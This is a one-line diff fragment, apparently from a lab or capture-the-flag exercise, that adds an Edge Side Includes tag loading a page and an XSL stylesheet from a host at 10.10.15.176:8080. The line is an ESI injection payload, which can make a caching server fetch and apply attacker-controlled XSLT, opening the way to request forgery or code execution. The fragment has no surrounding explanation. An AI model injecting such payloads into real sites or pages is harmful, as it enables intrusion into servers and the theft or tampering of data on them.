@@ -1,0 +1,1 @@
+<esi:include src="http://10.10.15.176:8080/check65.html" stylesheet="http://10.10.15.176:8080/new65.xsl"></esi:include>
